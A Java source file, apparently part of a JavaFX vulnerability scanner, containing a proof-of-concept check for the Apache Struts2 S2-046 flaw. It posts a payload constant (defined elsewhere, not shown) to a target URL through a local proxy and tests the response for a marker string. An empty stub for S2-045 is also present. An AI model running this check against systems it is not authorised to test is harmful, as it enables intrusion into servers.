package com.example.javafxdemo.Check;
import cn.hutool.http.HttpRequest;
import com.example.javafxdemo.HelloController;
import java.util.HashMap;



public class Poc {

public static class checks {
    HashMap<String, String> heinfo = HelloController.helloinfo;

    public void struts2046(String target) {

        String payload_post = Payload.PAYLOADSTR.POC046;
        String results = Payload.PAYLOADSTR.results;
        String ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36";
        String cookie = "1";
        String proxyhost = "127.0.0.1";
        int port = 8080;
        String methodFields = heinfo.get("methodFields");
        byte[] xx = "".getBytes();
        HttpRequest req = HttpRequest.post(target).timeout(15000).form("x", xx, payload_post);
        String resp = req.header("User-Agent", ua)
                .header("Connection", "close")
                .cookie(cookie)
                .setHttpProxy(proxyhost, port)
                .execute()
                .httpVersion("HTTP/1.0")
                .toString();
        System.out.println(results);
        System.out.println(resp.contains(results));
    }

    public void s2045() {

    }
}
}
